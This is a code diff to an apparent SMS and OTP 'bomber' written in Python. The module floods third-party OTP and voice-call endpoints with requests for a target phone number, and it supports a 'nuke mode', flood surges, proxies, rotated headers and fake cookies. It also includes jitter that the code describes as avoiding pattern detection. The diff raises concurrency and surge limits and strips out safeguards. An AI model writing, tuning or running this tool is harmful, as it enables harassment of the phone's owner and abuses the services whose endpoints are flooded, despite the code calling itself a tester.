@@ -15,17 +15,19 @@ from aiohttp_socks import ProxyConnector
 
 from helpers import injectRotatedHeaders
 
-# Global semaphore — created lazily inside event loop
+# ---------------------------------------------------------------------------
+# Global semaphore — lazy, created inside event loop
+# ---------------------------------------------------------------------------
 _GLOBAL_SEM: Optional[asyncio.Semaphore] = None
 
 def getGlobalSem() -> asyncio.Semaphore:
     global _GLOBAL_SEM
     if _GLOBAL_SEM is None:
-        _GLOBAL_SEM = asyncio.Semaphore(150)
+        _GLOBAL_SEM = asyncio.Semaphore(300)  # 300 concurrent max
     return _GLOBAL_SEM
 
 # ---------------------------------------------------------------------------
-# OTP detection keywords
+# OTP detection
 # ---------------------------------------------------------------------------
 OTP_KEYWORDS = (
     "otp sent", "otp has been sent", "verification code sent",
@@ -37,7 +39,6 @@ OTP_KEYWORDS = (
     "call initiated", "call placed", "calling", "voice call", "ivr",
 )
 
-# Honeypot patterns — APIs that fake success but do nothing
 _HONEYPOT_RE = re.compile(
     r'^\s*(\{\s*"status"\s*:\s*"ok"\s*\}|\{\s*"message"\s*:\s*"success"\s*\}'
     r'|\{\s*"code"\s*:\s*0\s*\}|\{\s*\}|true|1|ok)\s*$',
@@ -45,7 +46,7 @@ _HONEYPOT_RE = re.compile(
 )
 _honeypotApis:   Set[str]       = set()
 _honeypotCounts: Dict[str, int] = {}
-HONEYPOT_THRESHOLD = 5
+HONEYPOT_THRESHOLD = 8  # higher threshold = less false positives
 
 
 def isOtp(status: int, text: str) -> bool:
@@ -60,11 +61,6 @@ def checkHoneypot(name: str, text: str) -> bool:
         return True
     if _HONEYPOT_RE.match(text.strip()):
         _honeypotCounts[name] = _honeypotCounts.get(name, 0) + 1
-
-        # Prevent unbounded growth — cap at 500 entries
-        if len(_honeypotCounts) > 500:
-            _honeypotCounts.clear()
-
         if _honeypotCounts[name] >= HONEYPOT_THRESHOLD:
             _honeypotApis.add(name)
         return True
@@ -73,62 +69,46 @@ def checkHoneypot(name: str, text: str) -> bool:
 
 
 # ---------------------------------------------------------------------------
-# Phone variants — all 4 formats
+# Phone variants
 # ---------------------------------------------------------------------------
 def phoneVariants(phone: str) -> tuple:
     return (phone, f"91{phone}", f"+91{phone}", f"0{phone}")
 
 
 # ---------------------------------------------------------------------------
-# Lightweight placeholder replacement — NO deepcopy
+# Lightweight placeholder replacement — NO deepcopy ever
 # ---------------------------------------------------------------------------
 def _replaceStr(s: str, phone: str) -> str:
-    if "{phone}" in s:
-        s = s.replace("{phone}", phone)
-    if "{uuid}" in s:
-        s = s.replace("{uuid}", str(uuid.uuid4()))
-    if "{device_id}" in s:
-        s = s.replace("{device_id}", uuid.uuid4().hex)
-    if "{session_id}" in s:
-        s = s.replace("{session_id}", "".join(
-            random.choices(string.ascii_lowercase + string.digits, k=32)
-        ))
-    if "{timestamp}" in s:
-        s = s.replace("{timestamp}", str(int(time.time() * 1000)))
+    if "{phone}" in s:      s = s.replace("{phone}", phone)
+    if "{uuid}" in s:       s = s.replace("{uuid}", str(uuid.uuid4()))
+    if "{device_id}" in s:  s = s.replace("{device_id}", uuid.uuid4().hex)
+    if "{session_id}" in s: s = s.replace("{session_id}", uuid.uuid4().hex)
+    if "{timestamp}" in s:  s = s.replace("{timestamp}", str(int(time.time() * 1000)))
     return s
 
 
 def _replaceObj(obj, phone: str):
-    """Replace placeholders in dict/list/str without deepcopy."""
-    if obj is None:
-        return None
-    if isinstance(obj, str):
-        return _replaceStr(obj, phone)
-    if isinstance(obj, dict):
-        return {k: _replaceObj(v, phone) for k, v in obj.items()}
-    if isinstance(obj, list):
-        return [_replaceObj(v, phone) for v in obj]
+    if obj is None:            return None
+    if isinstance(obj, str):   return _replaceStr(obj, phone)
+    if isinstance(obj, dict):  return {k: _replaceObj(v, phone) for k, v in obj.items()}
+    if isinstance(obj, list):  return [_replaceObj(v, phone) for v in obj]
     return obj
 
 
 def _coerce(obj, original):
-    """Coerce string values to match original types."""
     if isinstance(original, dict) and isinstance(obj, dict):
         return {k: _coerce(obj.get(k, v), v) for k, v in original.items()}
     if isinstance(original, list) and isinstance(obj, list):
         return [_coerce(o, p) for o, p in zip(obj, original)]
     if isinstance(original, int) and isinstance(obj, str):
         try: return int(obj)
-        except (ValueError, TypeError): return obj
+        except: return obj
     if isinstance(original, float) and isinstance(obj, str):
         try: return float(obj)
-        except (ValueError, TypeError): return obj
+        except: return obj
     return obj
 
 
-# ---------------------------------------------------------------------------
-# Random cookie injection — lightweight
-# ---------------------------------------------------------------------------
 def _freshCookies(existing: Optional[dict]) -> dict:
     c = {
         "session_id": uuid.uuid4().hex,
@@ -142,26 +122,23 @@ def _freshCookies(existing: Optional[dict]) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# Shared connector — ONE per process, created lazily inside event loop
+# Shared connector — no per-host limit for maximum speed
 # ---------------------------------------------------------------------------
 _sharedConnector: Optional[TCPConnector] = None
 
 
 def getSharedConnector() -> TCPConnector:
     global _sharedConnector
-    try:
-        if _sharedConnector is None or _sharedConnector.closed:
-            _sharedConnector = TCPConnector(
-                limit=0,
-                limit_per_host=30,
-                ttl_dns_cache=600,
-                ssl=False,
-                keepalive_timeout=30,
-                force_close=False,
-                enable_cleanup_closed=True,
-            )
-    except Exception:
-        _sharedConnector = TCPConnector(limit=0, ssl=False)
+    if _sharedConnector is None or _sharedConnector.closed:
+        _sharedConnector = TCPConnector(
+            limit=0,              # unlimited total
+            limit_per_host=0,     # unlimited per host — max speed
+            ttl_dns_cache=600,
+            ssl=False,
+            keepalive_timeout=60,
+            force_close=False,
+            enable_cleanup_closed=True,
+        )
     return _sharedConnector
 
 
@@ -176,23 +153,22 @@ class ApiState:
     )
     ACTIVE   = "active"
     HONEYPOT = "honeypot"
-
-    MIN_C = 1
-    MAX_C = 32
+    MIN_C    = 2
+    MAX_C    = 64   # higher cap for speed
 
     def __init__(self, name: str, base: int):
-        self.name          = name
-        self.status        = self.ACTIVE
-        self.requests      = 0
-        self.confirmed     = 0
-        self.responses2xx  = 0
-        self.rateLimits    = 0
-        self.errors        = 0
+        self.name           = name
+        self.status         = self.ACTIVE
+        self.requests       = 0
+        self.confirmed      = 0
+        self.responses2xx   = 0
+        self.rateLimits     = 0
+        self.errors         = 0
         self.totalLatencyMs = 0.0
-        self.latencyCount  = 0
-        self.concurrency   = min(base, self.MAX_C)
-        self._sw           = 0   # success window
-        self._ew           = 0   # error window
+        self.latencyCount   = 0
+        self.concurrency    = min(base, self.MAX_C)
+        self._sw            = 0
+        self._ew            = 0
 
     def avgMs(self) -> int:
         return int(self.totalLatencyMs / self.latencyCount) if self.latencyCount else 0
@@ -205,7 +181,7 @@ class ApiState:
             return
         rate = self._sw / total
         if rate >= 0.7:
-            self.concurrency = min(self.concurrency + 2, self.MAX_C)
+            self.concurrency = min(self.concurrency + 4, self.MAX_C)
         elif rate <= 0.3:
             self.concurrency = max(self.concurrency - 1, self.MIN_C)
         self._sw = 0
@@ -213,7 +189,7 @@ class ApiState:
 
 
 # ---------------------------------------------------------------------------
-# Stats — no asyncio lock, GIL is enough for CPython int ops
+# Stats
 # ---------------------------------------------------------------------------
 class Stats:
     __slots__ = (
@@ -258,8 +234,8 @@ class Stats:
         self.totalReqs += 1
         s = self.apiStates.get(name)
         if s:
-            s.requests    += 1
-            s.rateLimits  += 1
+            s.requests   += 1
+            s.rateLimits += 1
 
     def recordError(self, name: str) -> None:
         self.totalReqs += 1
@@ -279,14 +255,14 @@ class Stats:
         perApi = {}
         for name, s in self.apiStates.items():
             perApi[name] = {
-                "requests":   s.requests,
-                "confirmed":  s.confirmed,
-                "responses":  s.responses2xx,
-                "errors":     s.errors,
-                "ratelimits": s.rateLimits,
-                "avgMs":      s.avgMs(),
-                "status":     s.status,
-                "concurrency":s.concurrency,
+                "requests":    s.requests,
+                "confirmed":   s.confirmed,
+                "responses":   s.responses2xx,
+                "errors":      s.errors,
+                "ratelimits":  s.rateLimits,
+                "avgMs":       s.avgMs(),
+                "status":      s.status,
+                "concurrency": s.concurrency,
             }
         return {
             "totalReqs":  self.totalReqs,
@@ -303,7 +279,7 @@ class Stats:
 
 
 # ---------------------------------------------------------------------------
-# Single API call — no deepcopy, global semaphore, jitter
+# Single API call — fast, no deepcopy, global semaphore
 # ---------------------------------------------------------------------------
 async def callApi(
     session: aiohttp.ClientSession,
@@ -321,10 +297,9 @@ async def callApi(
     if s and s.status == ApiState.HONEYPOT:
         return False
 
-    # Jitter 0-50ms — avoids pattern detection, spaces out bursts
-    await asyncio.sleep(random.uniform(0, 0.05))
+    # Tiny jitter 0-30ms — just enough to avoid thundering herd
+    await asyncio.sleep(random.uniform(0, 0.03))
 
-    # Build request params WITHOUT deepcopy
     variants = phoneVariants(phone)
     p        = variants[int(time.time() * 1000) % 4]
 
@@ -345,7 +320,7 @@ async def callApi(
                 json=jsonData,
                 data=data,
                 cookies=cookies,
-                timeout=aiohttp.ClientTimeout(total=6, connect=2),
+                timeout=aiohttp.ClientTimeout(total=8, connect=3),
                 allow_redirects=True,
                 ssl=False,
             ) as resp:
@@ -373,7 +348,7 @@ async def callApi(
         stats.recordError(name)
         return False
     except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
-            aiohttp.ClientOSError, aiohttp.ClientResponseError):
+            aiohttp.ClientOSError):
         stats.recordError(name)
         return False
     except Exception:
@@ -382,7 +357,7 @@ async def callApi(
 
 
 # ---------------------------------------------------------------------------
-# Per-API worker — memory efficient, controlled concurrency
+# Per-API worker — dedicated, always firing, no stopping
 # ---------------------------------------------------------------------------
 async def apiWorker(
     api: dict,
@@ -391,12 +366,11 @@ async def apiWorker(
     stopEvent: asyncio.Event,
     baseConcurrency: int,
     burstDuration: float = 15.0,
-    burstMultiplier: int  = 3,
+    burstMultiplier: int = 5,   # back to 5x burst
 ) -> None:
-    # Use shared connector — no per-worker session overhead
     session = aiohttp.ClientSession(
         connector=getSharedConnector(),
-        connector_owner=False,   # don't close shared connector
+        connector_owner=False,
     )
 
     try:
@@ -409,19 +383,19 @@ async def apiWorker(
             if s and s.status == ApiState.HONEYPOT:
                 break
 
-            # Clean finished tasks — critical for memory
+            # Clean finished
             done        = {t for t in activeTasks if t.done()}
             activeTasks -= done
 
-            # Count flood bonus from successes
+            # Flood bonus from successes
             for t in done:
                 try:
                     if t.result():
-                        floodBudget = min(floodBudget + 2, 10)  # cap flood budget
+                        floodBudget = min(floodBudget + 3, 20)
                 except Exception:
                     pass
 
-            # Determine target concurrency
+            # Concurrency target
             elapsed = time.monotonic() - startTime
             base    = s.concurrency if s else baseConcurrency
             if elapsed < burstDuration:
@@ -429,8 +403,8 @@ async def apiWorker(
             else:
                 target = base
 
-            # Fire flood budget
-            if floodBudget > 0 and len(activeTasks) < target + 5:
+            # Fire flood
+            if floodBudget > 0 and len(activeTasks) < target + 10:
                 task = asyncio.create_task(
                     callApi(session, api, phone, stats, stopEvent)
                 )
@@ -438,16 +412,15 @@ async def apiWorker(
                 floodBudget -= 1
                 continue
 
-            # Normal fill
+            # Normal fill — keep firing constantly
             if len(activeTasks) < target:
                 task = asyncio.create_task(
                     callApi(session, api, phone, stats, stopEvent)
                 )
                 activeTasks.add(task)
             else:
-                await asyncio.sleep(0.001)  # yield — prevents CPU spin
+                await asyncio.sleep(0)  # yield only when full
 
-        # Cancel remaining tasks
         for t in activeTasks:
             t.cancel()
         if activeTasks:
@@ -459,15 +432,15 @@ async def apiWorker(
 
 
 # ---------------------------------------------------------------------------
-# Flood surge — periodic wave, capped size for memory safety
+# Flood surge — big wave every 10s
 # ---------------------------------------------------------------------------
 async def floodSurge(
     apis: List[dict],
     phone: str,
     stats: Stats,
     stopEvent: asyncio.Event,
-    surgeSize: int   = 80,    # reduced from 500 — safe for free tier
-    interval: float  = 15.0,  # every 15s instead of 10s
+    surgeSize: int  = 300,  # back to high surge
+    interval: float = 10.0,
 ) -> None:
     session = aiohttp.ClientSession(
         connector=getSharedConnector(),
@@ -493,14 +466,13 @@ async def floodSurge(
                 continue
 
             stats.surgeCount += 1
-            tasks = []
-            for idx in range(surgeSize):
-                api  = activeApis[idx % len(activeApis)]
-                task = asyncio.create_task(
-                    callApi(session, api, phone, stats, stopEvent)
+            tasks = [
+                asyncio.create_task(
+                    callApi(session, activeApis[idx % len(activeApis)],
+                            phone, stats, stopEvent)
                 )
-                tasks.append(task)
-
+                for idx in range(surgeSize)
+            ]
             await asyncio.gather(*tasks, return_exceptions=True)
             tasks.clear()
 
@@ -513,12 +485,12 @@ async def floodSurge(
 # ---------------------------------------------------------------------------
 async def testSingleApi(api: dict, phone: str) -> dict:
     try:
-        url     = api["url"].replace("{phone}", phone)
-        headers = injectRotatedHeaders(_replaceObj(api.get("headers") or {}, phone))
-        params  = _replaceObj(api.get("params"), phone)
-        json_   = _coerce(_replaceObj(api.get("json"), phone), api.get("json"))
-        data    = _replaceObj(api.get("data"), phone)
-        cookies = _replaceObj(api.get("cookies"), phone)
+        url      = api["url"].replace("{phone}", phone)
+        headers  = injectRotatedHeaders(_replaceObj(api.get("headers") or {}, phone))
+        params   = _replaceObj(api.get("params"), phone)
+        jsonData = _coerce(_replaceObj(api.get("json"), phone), api.get("json"))
+        data     = _replaceObj(api.get("data"), phone)
+        cookies  = _replaceObj(api.get("cookies"), phone)
 
         connector = TCPConnector(limit=5, ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
@@ -526,7 +498,7 @@ async def testSingleApi(api: dict, phone: str) -> dict:
             async with session.request(
                 api["method"], url,
                 headers=headers, params=params,
-                json=json_, data=data, cookies=cookies,
+                json=jsonData, data=data, cookies=cookies,
                 timeout=aiohttp.ClientTimeout(total=15),
                 allow_redirects=True,
             ) as resp:
@@ -562,15 +534,9 @@ async def validateProxies(proxyList: List[str]) -> List[str]:
 
 
 # ---------------------------------------------------------------------------
-# Runner — memory safe, gc after every test
+# Runner
 # ---------------------------------------------------------------------------
 class TesterRunner:
-    __slots__ = (
-        "phones", "phone", "duration", "workers", "useProxy",
-        "_proxyList", "_userId", "_bot", "nukeMode",
-        "_apiConfigs", "_skipSet", "stats", "_stopEvent",
-        "_tasks", "_running", "_endTime",
-    )
 
     def __init__(
         self,
@@ -588,7 +554,7 @@ class TesterRunner:
         self.phones  = raw if raw else [phone]
         self.phone   = self.phones[0]
         self.duration  = duration
-        self.workers   = min(workers if not nukeMode else 32, 32)  # hard cap at 32
+        self.workers   = workers if not nukeMode else 64
         self.useProxy  = useProxy
         self._proxyList = proxyList or []
         self._userId   = userId
@@ -615,7 +581,6 @@ class TesterRunner:
         self._endTime = time.time() + self.duration
         self._stopEvent.clear()
 
-        # Reset honeypot tracking per session
         _honeypotApis.clear()
         _honeypotCounts.clear()
 
@@ -627,12 +592,12 @@ class TesterRunner:
 
         activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]
 
-        # Nuke = burst forever at 3x, normal = 15s burst at 2x
         burstDuration   = 9999.0 if self.nukeMode else 15.0
-        burstMultiplier = 3      if self.nukeMode else 2
-        surgeSize       = 100    if self.nukeMode else 60
-        surgeInterval   = 12.0   if self.nukeMode else 20.0
+        burstMultiplier = 8      if self.nukeMode else 5
+        surgeSize       = 500    if self.nukeMode else 300
+        surgeInterval   = 8.0    if self.nukeMode else 10.0
 
+        # Launch ONE dedicated worker per API — all simultaneously
         for phone in self.phones:
             for api in activeApis:
                 task = asyncio.create_task(
@@ -649,10 +614,9 @@ class TesterRunner:
                 )
                 self._tasks.append(task)
 
-            # Flood surge per phone
             self._tasks.append(asyncio.create_task(
-                floodSurge(activeApis, phone, self.stats, self._stopEvent,
-                           surgeSize, surgeInterval),
+                floodSurge(activeApis, phone, self.stats,
+                           self._stopEvent, surgeSize, surgeInterval),
                 name=f"surge_{phone[:4]}"
             ))
 
@@ -666,7 +630,6 @@ class TesterRunner:
         await asyncio.gather(*self._tasks, return_exceptions=True)
         self._tasks.clear()
         self._running = False
-        # Force garbage collection — reclaim memory immediately
         gc.collect()
 
     async def _timer(self) -> None:
@@ -681,5 +644,4 @@ class TesterRunner:
         if workerTasks:
             await asyncio.gather(*workerTasks, return_exceptions=True)
         self._running = False
-        # Force gc when test finishes naturally
         gc.collect()
